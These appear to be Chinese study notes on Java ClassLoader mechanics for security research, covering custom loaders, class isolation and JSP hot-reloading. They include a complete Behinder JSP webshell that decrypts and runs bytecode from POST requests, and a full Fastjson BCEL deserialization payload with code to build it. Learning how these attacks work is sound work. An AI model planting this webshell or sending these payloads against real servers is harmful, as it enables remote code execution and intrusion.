
- [ ] fastjson的bcel流跟踪
- [ ] Xalan ClassLoader流跟踪
- [ ] jsp类加载
- [ ] 链接： https://zhishihezi.net/endpoint/richtext/76290e1cf5ea224079c2e19ef2984523?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94fe1f64ee5f89a14f9f2c51b1e7fd51abb32b4fdde0084702d700490f389f94bbcb75cffaba1f0a15ef9612b9bec4f37f28f6a5060234a20e387783a74eb2e82a5d315a41691227b1cbf9f2c73ea76d37b74120cf26a4df8d4d2392b651c89e69ff8053508331e44e6a55c9a8abcccf65ab715e389a54ee481c5d4f195955782dcbb795a6251c1c74cd16e7800b57d4871#10

# ClassLoader

jvm的架构图

![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/JvmSpec7.png)

运行流程:

```
编译javac -> class文件 -> java.lang.ClassLoader 加载字节码 -》 defineClass0/1/2）来定义一个java.lang.Class实例
```

### 1. ClassLoader

分类:

```
Bootstrap ClassLoader（引导类加载器）
Extension ClassLoader（扩展类加载器）
App ClassLoader（系统类加载器）
```

获取系统默认支持的加载器

```
System.out.println(ClassLoader.getSystemClassLoader());
sun.misc.Launcher$AppClassLoader@18b4aac2
```

**注意**:bridge_at_night:

有时候获取的ClassLoader 返回null，因为是native层的代码，所以。

ClassLoader的方法:

1. `loadClass`（加载指定的Java类）
2. `findClass`（查找指定的Java类）
3. `findLoadedClass`（查找JVM已经加载过的类）
4. `defineClass`（定义一个Java类）
5. `resolveClass`（链接指定的Java类）

> ps: 链接指的是将Java类的二进制代码合并到JVM的运行状态之中的过程。

### 2. java类加载

两种 ：

1. 显式：反射 + ClassLoader

   ```
   Class.forname(""); //默认初始化静态属性
   this.getClass().getClassLoader().loadClass();//不初始化
   ```

2. 隐式 : **new + class**

详细介绍一下ClassLoader加载类的过程:

1. 首先ClassLoader 调用`findLoadedClass` 查看该类是否已经被加载，如果有之间返回，不会
2. 如果传入了父类ClassLoader 就调用父类的`loadclass` 方法，否则使用`Bootstrap ClassLoader`
3. 如果还未能加载该类的话，那么调用自身的`findClass`方法尝试加载
4. 如果该类被重载，就去寻找该类的字节码文件，然后去jvm注册该类
5. 如果调用loadClass的时候传入的`resolve`参数为true，那么还需要调用`resolveClass`方法链接类，默认为false。

### 3. 自定义ClassLoader

用于加载jar包的`java.net.URLClassLoader`

```
public class TestClassLoader extends ClassLoader {
@Override
    public Class<?> findClass(String name) throws ClassNotFoundException {
        // 只处理TestHelloWorld类
        if (name.equals(testClassName)) {
            // 调用JVM的native方法定义TestHelloWorld类
            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
        }

        return super.findClass(name);
    }
}
```

利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象

### 4. 类加载隔离

:a:**不同的ClassLoader可以加载相同的Class（两则必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。**

![image-20211025171150475](https://gitee.com/Cralwer/typora-pic/raw/master/images/202110251829223.png)

```java
package com.dem0.ClassLoader;

import java.lang.reflect.Method;
import java.util.Calendar;

import static com.dem0.ClassLoader.TestClassLoader.testClassBytes;
import static com.dem0.ClassLoader.TestClassLoader.testClassName;
public class TestCrossClassLoader {
    public static class ClassLoaderA extends ClassLoader{
        public ClassLoaderA(ClassLoader parent){
            super(parent);
        }
        {
            defineClass(testClassName,testClassBytes,0, testClassBytes.length);
        }
    }

    public static class  ClassLoaderB extends ClassLoader{
        public ClassLoaderB(ClassLoader parent){
            super(parent);
        }
        {
            defineClass(testClassName,testClassBytes,0, testClassBytes.length);
        }
    }

    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        //获取父类的类加载器
        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();
        //实例化两个类加载器
        ClassLoader aClassLoader = new ClassLoaderA(parentClassLoader);
        ClassLoader bClassLoader = new ClassLoaderB(parentClassLoader);
        //实例化test
        Class<?> aClass  = Class.forName(testClassName, true, aClassLoader);
        Class<?> aaClass = Class.forName(testClassName,true,aClassLoader);
        Class<?> bClass = Class.forName(testClassName,true,bClassLoader);

        System.out.println("aClass == aaClass : " + (aClass == aaClass));
        System.out.println("aClass == bClass :  " + (aaClass == bClass));

        System.out.println("\n" + aClass.getName() + "方法清单：");
        Method[] methods = aClass.getDeclaredMethods();

        for (Method method : methods) {
            System.out.println(method);
        }

        // 创建类实例
        Object instanceA = aClass.newInstance();

        // 获取hello方法
        Method helloMethod = aClass.getMethod("hello");
    }
}

```

可以看到这里面的a和b是同一级的加载器 他们的加载出来的class是不一样。

### 5. 冰蝎jsp

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    class U extends ClassLoader {

        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%>
<%
    if (request.getMethod().equals("POST")) {
        String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        session.putValue("u", k);
        Cipher c = Cipher.getInstance("AES");
        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>
```

可以看到就是一个类加载器加载请求中的字节码来达到rce的作用。

### 6. BCEL ClassLoader

BCEL的类加载器在解析类名时会对ClassName中有`$$BCEL$$`标识的类做特殊处理，该特性经常被利用来写payload。

如果被加载的类名中包含了`$$BCEL$$`关键字，BCEL就会使用特殊的方式进行解码并加载解码之后的类。

:a:  特性：

 当BCEL的`loadCLass` 加载的类名中包含`$$BCLE$$`时，会截取出后面的数据解码成字节码然后用`defineClass`注册解码后的类

:b:影响版本: 

 BCEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始`org.apache.bcel.classfile.ConstantUtf8#setBytes`就已经过时了，

:white_circle:示例:

```java
{"@type":"org.apache.commons.dbcp.BasicDataSource","driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85R$5bO$TA$U$fe$a6$z$dde$bbXX$$$e2$F$z$8aPJ$e9r$x$X$r$3e$d8$60$a2$U1$b6$b1$89o$d3$e9$a4$ynw$9b$dd$a9$c2$l1$f1$X$f0$cc$L$S$l$fc$B$fe$p$l4$9e$5d$h$U$rqvsf$ce7$e7$7c$e7$9b$99$f3$f5$c7$e7$_$AV$b0i$m$8b$9b$3an$e9$b8m$60$Kwt$dc5$90$c3$b4$8e$7b$3a$ee$eb$981$f0$A$b3$91$99$d3$907$60b$5eCA$c3$CCz$db$f1$i$f5$98$n$99$9f$7f$cd$90$aa$f8$z$c9$90$ad$3a$9e$7c$d1$eb4eP$e7M$97$Q$7d$5b$b8$fd$c8$a1$9a$e2$e2$ed$k$ef$c6$5b$g$8a$c4$c9$60$d4$fc$5e$m$e4S$t$8a$b6$ea2TO$w$3b$d5$8a$cb$c3$b0t$c8$dfq$T$c3$Ya$98$f0$bb$d2$cb$z$f2$5c$85$bb$a2$e7r$e5$H$r$de$ed2h$7eX$f2x$87$f8$WM$94$60$T$d2p$bc$96$ff$3e$a4$K$s$96$b0L$c9$82$92r$cb$x$abk$e5$f5$8d$cd$ad$a5$fe$8aa$80$f4$f6$8e$Y$c6D$_ps$aeOq$H$7e$a8$kn$d1$b05$ac$98X$c5$9a$892$d6$ZF$p5$b6$e3$db$cf$f6w$8e$84$ec$w$c7$f7LlD$e2$e6$84$df$b1$b9$d7$e4$8e$jJa$8bH$bc$eb$f3$96$M$ecK$Hb$Y$8eI$5c$ee$b5$ed$fd$e6$a1$U$ea$STS$81$e3$b5$_C$c7$a1$92$j$86L$5b$aa$97$B$5dB$a0$8e$Zf$f3$d5$bf$b3$k$cd$ff$L$d1$ed$86$8a$H$wl8$ea$80a$fc$aa$ac7$M$p$bf$d1W$3dO9$jz$J$83$ea$5d8$e3$f9$3f$c9$fb0$b1$a7$e4$91$Ut$fc$ff$a8$n$ddB$86$n$rd$bb$b4$a9$e2$3e$a8$H$5cHL$e3$g$f5$604$S$60$d1K$93$b5$c8$9b$a2$99$d1$3cP$f8$EvJ$L$ba$7f$b2$e9_$mt$8c$5d$84$7e$a0$d4$q$cde$x$b1k$r$cf$91$aa$$X$DgH$7f$c4$a0$a5$ed$9e$m$bb$60$e9$b1$9b$b6$Gw$cfa$U$ce$90i$9c$40$df$x$9ea$e8$94HfP$84M$bd$9d$88K$94$90$n$ab$T$e5$m$7d$Z$wab$SC$b1$d2$Z$f2$8a$Y$a7$e8Qj$ac1$aca$82$3c$90$97$fa$8eI$N$T$f4g$9ek$b8$fe$N$v$o$9e$8c$8fu$e3$t$b2$b7e$b6p$D$A$A","driverClassLoader":{"@type":"org.apache.bcel.util.ClassLoader"}}
```

这是Fastjson(1.1.15 - 1.2.4)的一条链子。 我们必须明白Fastjson的特性自调用setter和getter方法

这里: 他就会调用`org.apache.commons.dbcp.BasicDataSource` 修改他的`driverClassName`和`driverClassLoader` 单从这里来说，并不足以来触发反序列化。

:red_circle:FastJson会自动调用getter方法，`org.apache.commons.dbcp.BasicDataSource`本没有`connection`成员变量，但有一个`getConnection()`方法，按理来讲应该不会调用`getConnection()`方法，但是FastJson会通过`getConnection()`这个方法名计算出一个名为`connection`的field，详情参见：[com.alibaba.fastjson.util.TypeUtils#computeGetters](https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1904)，因此FastJson最终还是调用了`getConnection()`方法。

学习一下快速生成json的payload

```java
        // 构建恶意的JSON
        Map<String, Object> dataMap        = new LinkedHashMap<String, Object>();
        Map<String, Object> classLoaderMap = new LinkedHashMap<String, Object>();

        dataMap.put("@type", BasicDataSource.class.getName());
        dataMap.put("driverClassName", className);

        classLoaderMap.put("@type", org.apache.bcel.util.ClassLoader.class.getName());
        dataMap.put("driverClassLoader", classLoaderMap);

        String json = JSON.toJSONString(dataMap);
        System.out.println(json);
```

### 7.  Xalan ClassLoader

`private Properties _outputProperties;`属性与`getOutputProperties()`关联映射（FastJson的`smartMatch()`会忽略`_`、`-`、`is`（仅限boolean/Boolean类型）



### 8. JSP类加载

:a:当Servlet容器发现JSP文件发生了修改后就会创建一个新的类加载器来替代原类加载器，而被替代后的类加载器所加载的文件并不会立即释放，而是需要等待GC。

```java
package com.anbai.sec.classloader;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.File;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Map;

public class TestJSPClassLoader {

    /**
     * 缓存JSP文件和类加载，刚jsp文件修改后直接替换类加载器实现JSP类字节码热加载
     */
    private final Map<File, JSPClassLoader> jspClassLoaderMap = new HashMap<File, JSPClassLoader>();

    /**
     * 创建用于测试的test.jsp类字节码，类代码如下：
     * <pre>
     * package com.anbai.sec.classloader;
     *
     * public class test_jsp {
     *     public void _jspService() {
     *         System.out.println("Hello...");
     *     }
     * }
     * </pre>
     *
     * @param className 类名
     * @param content   用于测试的输出内容，如：Hello...
     * @return test_java类字节码
     * @throws Exception 创建异常
     */
    public static byte[] createTestJSPClass(String className, String content) throws Exception {
        // 使用Javassist创建类字节码
        ClassPool classPool = ClassPool.getDefault();

        // 创建一个类，如：com.anbai.sec.classloader.test_jsp
        CtClass ctServletClass = classPool.makeClass(className);

        // 创建_jspService方法
        CtMethod ctMethod = new CtMethod(CtClass.voidType, "_jspService", new CtClass[]{}, ctServletClass);
        ctMethod.setModifiers(Modifier.PUBLIC);

        // 写入hello方法代码
        ctMethod.setBody("System.out.println(\"" + content + "\");");

        // 将hello方法添加到类中
        ctServletClass.addMethod(ctMethod);

        // 生成类字节码
        byte[] bytes = ctServletClass.toBytecode();

        // 释放资源
        ctServletClass.detach();

        return bytes;
    }

    /**
     * 检测jsp文件是否改变，如果发生了修改就重新编译jsp并更新该jsp类字节码
     *
     * @param jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在
     * @param className 类名
     * @param bytes     类字节码
     * @param parent    JSP的父类加载
     */
    public JSPClassLoader getJSPFileClassLoader(File jspFile, String className, byte[] bytes, ClassLoader parent) {
        JSPClassLoader jspClassLoader = this.jspClassLoaderMap.get(jspFile);

        // 模拟第一次访问test.jsp时jspClassLoader是空的，因此需要创建
        if (jspClassLoader == null) {
            jspClassLoader = new JSPClassLoader(parent);
            jspClassLoader.createClass(className, bytes);

            // 缓存JSP文件和所使用的类加载器
            this.jspClassLoaderMap.put(jspFile, jspClassLoader);

            return jspClassLoader;
        }

        // 模拟第二次访问test.jsp，这个时候内容发生了修改，这里实际上应该检测文件的最后修改时间是否相当，
        // 而不是检测是否是0，因为当jspFile不存在的时候返回值是0，所以这里假设0表示这个文件被修改了，
        // 那么需要热加载该类字节码到类加载器。
        if (jspFile.lastModified() == 0) {
            jspClassLoader = new JSPClassLoader(parent);
            jspClassLoader.createClass(className, bytes);

            // 缓存JSP文件和所使用的类加载器
            this.jspClassLoaderMap.put(jspFile, jspClassLoader);
            return jspClassLoader;
        }

        return null;
    }

    /**
     * 使用动态的类加载器调用test_jsp#_jspService方法
     *
     * @param jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在
     * @param className 类名
     * @param bytes     类字节码
     * @param parent    JSP的父类加载
     */
    public void invokeJSPServiceMethod(File jspFile, String className, byte[] bytes, ClassLoader parent) {
        JSPClassLoader jspClassLoader = getJSPFileClassLoader(jspFile, className, bytes, parent);

        try {
            // 加载com.anbai.sec.classloader.test_jsp类
            Class<?> jspClass = jspClassLoader.loadClass(className);

            // 创建test_jsp类实例
            Object jspInstance = jspClass.newInstance();

            // 获取test_jsp#_jspService方法
            Method jspServiceMethod = jspClass.getMethod("_jspService");

            // 调用_jspService方法
            jspServiceMethod.invoke(jspInstance);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        TestJSPClassLoader test = new TestJSPClassLoader();

        String      className   = "com.anbai.sec.classloader.test_jsp";
        File        jspFile     = new File("/data/test.jsp");
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();

        // 模拟第一次访问test.jsp文件自动生成test_jsp.java
        byte[] testJSPClass01 = createTestJSPClass(className, "Hello...");

        test.invokeJSPServiceMethod(jspFile, className, testJSPClass01, classLoader);

        // 模拟修改了test.jsp文件，热加载修改后的test_jsp.class
        byte[] testJSPClass02 = createTestJSPClass(className, "World...");
        test.invokeJSPServiceMethod(jspFile, className, testJSPClass02, classLoader);
    }

    /**
     * JSP类加载器
     */
    static class JSPClassLoader extends ClassLoader {

        public JSPClassLoader(ClassLoader parent) {
            super(parent);
        }

        /**
         * 创建类
         *
         * @param className 类名
         * @param bytes     类字节码
         */
        public void createClass(String className, byte[] bytes) {
            defineClass(className, bytes, 0, bytes.length);
        }

    }

}
```

需要理解**Javassist**动态产生新的类以及生成相应的字节码文件。

以上代码大致分为以下几步:

1. 模拟用户第一次访问jsp
2. 检查是否有该jsp的缓存，有就拿出来用，没有就创建
3. 创建test.jsp文件专用的类加载器`jspClassLoader`，并缓存到`jspClassLoaderMap`对象中
4. jspClassLoader加载对应的字节码文件并创建com.anbai.sec.classloader.test_jsp
5. 并且为他生成__jsp_service方法。
6. 第二次就是同样的道理
